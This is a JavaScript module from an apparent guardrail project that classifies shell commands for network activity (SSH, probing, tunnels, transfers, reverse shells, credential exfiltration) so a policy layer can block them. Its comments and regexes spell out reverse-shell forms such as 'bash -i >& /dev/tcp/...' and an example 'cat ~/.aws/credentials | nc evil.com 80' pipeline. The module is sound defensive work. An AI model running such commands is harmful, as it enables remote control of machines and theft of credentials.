/* Auren - commands.js
 *
 * Lightweight, rule-based classifier for OS/terminal-level COMMANDS. It is
 * deliberately decoupled from any policy: this module only emits "this command
 * does network-y things: [types]" signals. A separate policy layer
 * (src/core/policy.js) decides what to do (by default: block).
 *
 * It accepts:
 *   - a raw shell command line (string), or
 *   - argv (array of strings).
 *
 * Signal types emitted (rules are intentionally conservative - false-positive
 * towards "sensitive" so a guardrail errs on the side of blocking):
 *   'cmd_ssh'          ssh/scp/sftp/rsync to a remote host
 *   'cmd_ping'         ping / traceroute / mtr (ICMP egress probes)
 *   'cmd_probe'        nc / telnet / nmap / socat port probing
 *   'cmd_tunnel'       ssh -L/-R/-D, autossh, socat relays
 *   'cmd_suspicious_443' ssh -p 443 / stunnel / openssl s_client / nc or socat
 *                      pointed at a remote port 443 (a non-HTTPS protocol
 *                      masquerading on the HTTPS port — the classic tunnel)
 *   'cmd_transfer'     curl / wget / aria2c / ftp / rclone / s3 upload+download
 *   'cmd_reverse_shell' classic reverse-shell patterns (nc -e, /dev/tcp, ...)
 *   'cmd_remote_admin' remote database / cluster admin (mysql, redis-cli, ...)
 *   'cmd_exfil'        reads a credential store and pipes/copies it to a
 *                      network tool or remote host
 *
 * Nothing here is executed, stored, logged, or transmitted. This module never
 * touches the filesystem or the network.
 */

'use strict';

const SEGMENT_RE = /(?:\|\||&&|\||;)/;

// Wrapper commands that don't change what the segment actually runs.
const WRAPPERS = new Set(['sudo', 'env', 'nohup', 'nice', 'command', 'time', 'which', 'xargs']);

const SSH_CMDS = new Set(['ssh', 'scp', 'sftp', 'sshfs', 'autossh', 'plink', 'rsync']);
const PING_CMDS = new Set(['ping', 'ping6', 'traceroute', 'tracepath', 'mtr']);
const PROBE_CMDS = new Set(['nc', 'ncat', 'netcat', 'telnet', 'nmap', 'socat', 'hping3', 'hping']);
const TRANSFER_CMDS = new Set(['curl', 'wget', 'aria2c', 'ftp', 'lftp', 'rclone', 's3cmd', 'ftpget', 'ftpput', 'aws', 'gsutil', 'az']);
const REMOTE_ADMIN_CMDS = new Set(['mysql', 'psql', 'redis-cli', 'mongosh', 'mongo', 'clickhouse-client', 'kubectl', 'docker', 'ansible', 'ansible-playbook', 'expect', 'sshpass']);

const EXFIL_PATH_RE = /(?:\.ssh|\.aws|\.config[/\\]gh|\.gnupg|\.netrc|\.env\b|credentials|id_rsa|id_ed25519|\.pem\b|aws_access_key|password(?:s)?\.txt|secret(?:s)?\.(?:txt|json))/i;

// Classic reverse-shell / remote-connection-in-shell patterns, matched against
// each raw segment.
const REVERSE_SHELL_RES = [
  /(?:^|[;&|]\s*|\s)(?:nc|ncat|netcat)\s+(?:-[a-z0-9]*e\b|--exec)/, // nc -e /bin/sh
  /bash\s+-i\s+[<>]&?\s*\/dev\/tcp\//,                    // bash -i >& /dev/tcp/host/port
  /sh\s+-i\s+[<>]&\s*\/dev\/tcp\//,                       // sh -i <& /dev/tcp/...
  /mkfifo\b.*\bnc\b|\bnc\b.*\bmkfifo\b/,                  // mkfifo /tmp/f; cat | nc ...
  /python\d?\s+-[cC]\s+['\"][^'\"]*(?:socket|pty|reverse)/, // python -c socket/pty
  /perl\s+-[eE]\s+['\"][^'\"]*(?:IO::Socket|socket)/,     // perl -e IO::Socket
  /\/dev\/tcp\/[^\s/]+\/\d+/,                             // any bash /dev/tcp/host/port use
  /bash\s+-c\s+['\"][^'\"]*\/dev\/tcp\//                  // bash -c '... /dev/tcp/...'
];

// `aws s3`, `gsutil`, and `az storage` are storage transfer tools; a bare
// `aws`/`az` may be something else, so require the subcommand.
function isTransferSubcommand(argv) {
  const base = argv[0] ? argv[0].toLowerCase() : '';
  const sub = argv[1] ? argv[1].toLowerCase() : '';
  if (base === 'aws') return sub === 's3';
  if (base === 'az') return sub === 'storage';
  if (base === 'gsutil') return true;
  return false;
}

// Remote target present? scp/sftp/rsync use user@host:path; ssh uses a host arg.
function hasRemoteTarget(argv) {
  return argv.some((a) => {
    if (/^-\w+$/.test(a)) return false;
    if (/[<>|&$`]/.test(a)) return false;
    if (/^user?@/.test(a) && a.includes(':')) return true;
    if (a.includes(':') && !a.startsWith('-')) return true;
    return false;
  });
}

function isRemoteAdmin(argv) {
  const base = argv[0] ? argv[0].toLowerCase() : '';
  // A remote -h/-H host that isn't localhost, or kubectl/docker against a
  // remote context.
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if (a === '-h' || a === '-H' || a === '--host' || a === '--context' || a === '-c') {
      const next = argv[i + 1];
      if (next && !/^localhost|127\.0\.0\.1|::1|^$/.test(next)) return true;
    }
    if (base === 'kubectl' && a === 'exec') return true;
    if (base === 'docker' && a === 'exec') return true;
    if (a === 'ssh') return true;
  }
  // Connection-string URIs (mongodb://..., postgres://...): remote unless the
  // embedded host is loopback.
  const URI_RE = /^[a-z][a-z0-9+.-]*:\/\/[^\s/]+/i;
  for (const a of argv) {
    const m = URI_RE.exec(a);
    if (!m) continue;
    const rest = m[0];
    const withoutCreds = /\/\/[^@]*@/.test(rest) ? rest.replace(/^[a-z0-9+.-]*:\/\/[^@]*@/, '') : rest.replace(/^[a-z0-9+.-]*:\/\//, '');
    const host = withoutCreds.split(/[:/?#]/)[0];
    if (host && !/^localhost|127\.0\.0\.1|::1$/.test(host)) return true;
  }
  return false;
}

// Split a shell line into logical segments (pipes, &&, ||, ;) so a pipeline
// like `cat ~/.aws/credentials | nc evil.com 80` is classified as a whole.
function splitLine(line) {
  return String(line).split(SEGMENT_RE).map((s) => s.trim()).filter(Boolean);
}

// Minimal shell tokenizer (handles quotes, escapes). Good enough for
// classification; not a shell.
function tokenizeSegment(segment) {
  const tokens = [];
  let cur = '';
  let quote = null;
  for (let i = 0; i < segment.length; i++) {
    const c = segment[i];
    if (quote) {
      if (c === quote) quote = null;
      else cur += c;
      continue;
    }
    if (c === "'" || c === '"') { quote = c; continue; }
    if (c === '\\' && i + 1 < segment.length) { cur += segment[i + 1]; i++; continue; }
    if (c === ' ') { if (cur) { tokens.push(cur); cur = ''; } continue; }
    cur += c;
  }
  if (cur) tokens.push(cur);
  return tokens;
}

function baseCommand(argv) {
  let idx = 0;
  while (idx < argv.length && WRAPPERS.has(argv[idx].toLowerCase())) idx++;
  const raw = argv[idx] || '';
  return raw.toLowerCase().replace(/^.*[\\/]/, '').replace(/\.(?:exe|cmd)$/i, '');
}

function classifySegment(segment) {
  const types = new Set();
  const argv = tokenizeSegment(segment);
  if (argv.length === 0) return types;
  const cmd = baseCommand(argv);

  if (SSH_CMDS.has(cmd)) {
    // rsync can be purely local; ssh/scp/sftp/sshfs always mean a remote
    // session or copy. Conservative: any invocation of the remote tools
    // counts, even a usage line.
    if (cmd !== 'rsync' || hasRemoteTarget(argv)) types.add('cmd_ssh');
  }
  if (PING_CMDS.has(cmd)) types.add('cmd_ping');
  if (PROBE_CMDS.has(cmd)) types.add('cmd_probe');
  if (TRANSFER_CMDS.has(cmd) || isTransferSubcommand(argv)) types.add('cmd_transfer');
  if (REMOTE_ADMIN_CMDS.has(cmd) && isRemoteAdmin(argv)) types.add('cmd_remote_admin');

  // A network tool pointed at a REMOTE port 443 with a non-HTTPS protocol is
  // the classic "tunnel on the HTTPS port" bypass. HTTPS (curl/wget to
  // https://...) is normal and intentionally NOT flagged — detection focuses
  // on tools that would carry arbitrary bytes over 443.
  if (cmd === 'stunnel' || cmd === 'sslh' || cmd === 'corkscrew') types.add('cmd_suspicious_443');
  if (cmd === 'openssl' && argv.includes('s_client') && argv.some((a) => a.includes(':443'))) {
    types.add('cmd_suspicious_443');
  }
  if ((SSH_CMDS.has(cmd) || PROBE_CMDS.has(cmd)) && targetsPort443(argv)) types.add('cmd_suspicious_443');

  // ssh tunnels are a distinct (worse) thing than a plain ssh session.
  for (const a of argv) {
    if (SSH_CMDS.has(cmd) && /^-[A-Za-z0-9]+$/.test(a) && !a.startsWith('-o') && /[LDR]/.test(a)) {
      types.add('cmd_tunnel');
    }
    if (cmd === 'autossh') types.add('cmd_tunnel');
    if (cmd === 'socat') types.add('cmd_tunnel');
  }

  for (const re of REVERSE_SHELL_RES) {
    if (re.test(segment)) { types.add('cmd_reverse_shell'); break; }
  }

  return types;
}

// True if this argv explicitly targets a REMOTE port 443 (not a listener, not
// an https:// URL). Detects: `-p 443` / `-P 443` / `-p443` / `--port=443` /
// `-o Port=443`, `host:443` (except http(s)://), and a bare positional `443`
// after a host token (e.g. `nc host 443`).
function targetsPort443(argv) {
  // Inbound/listening forms are not an egress tunnel.
  if (argv.some((a) => a === '-l' || a === '--listen' || /^(?:TCP|UDP|SSL)-LISTEN:/.test(a))) return false;
  for (let i = 0; i < argv.length; i++) {
    const a = argv[i];
    if ((a === '-p' || a === '-P' || a === '--port') && String(argv[i + 1] || '') === '443') return true;
    if (/^-[pP]=?443$/.test(a)) return true;
    if (/(?:^|\s)-[pP]\s+443(?:\s|$)/.test(a)) return true;
    if (a === '--port=443') return true;
    if (/^Port=443$/i.test(a)) return true;
    if (a.includes(':443') && !/^https?:\/\//.test(a) && !/LISTEN/.test(a)) return true;
    if (a === '443' && i > 0 && /^[\w.:-]+$/.test(argv[i - 1]) && !argv[i - 1].startsWith('-')) return true;
  }
  return false;
}

// Returns { sensitive: boolean, types: string[] }.
function classifyCommand(input) {
  const types = new Set();
  const raw = Array.isArray(input) ? input.join(' ') : String(input || '');

  for (const segment of splitLine(raw)) {
    for (const t of classifySegment(segment)) types.add(t);
  }

  // Credential-store exfiltration: a sensitive path combined with a network
  // tool or a remote copy in the same command line.
  if (EXFIL_PATH_RE.test(raw)) {
    const networkish = /(?:\bc(?:url|at)\b|\bnc\b|\bwget\b|\bscp\b|\brsync\b|\bftp\b|\brclone\b|\bs3cmd\b|\baws\s+s3\b|\bgsutil\b|\baz\s+storage\b|\/dev\/tcp\/|base64\b)/i;
    if (networkish.test(raw) || raw.split(SEGMENT_RE).length > 1) {
      types.add('cmd_exfil');
    }
  }

  return { sensitive: types.size > 0, types: Array.from(types) };
}

module.exports = {
  classifyCommand,
  tokenizeSegment,
  baseCommand,
  targetsPort443,
  SSH_CMDS,
  PING_CMDS,
  PROBE_CMDS,
  TRANSFER_CMDS,
  REMOTE_ADMIN_CMDS
};
